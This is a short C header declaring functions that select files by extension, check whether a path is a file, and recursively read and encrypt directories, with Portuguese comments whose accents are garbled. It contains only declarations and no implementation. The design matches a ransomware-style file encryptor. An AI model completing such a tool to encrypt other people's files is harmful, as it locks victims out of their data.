#ifndef _DIR_H
#define _DIR_H

#include <stdio.h>
#include <dirent.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>

bool interested_ext(char []); //O arquivo uma das extens�es desejadas?
bool is_file(char []); //� uma pasta?
void read_and_encrpyt_dirs(char [], int, bool);

#endif // _DIR_H
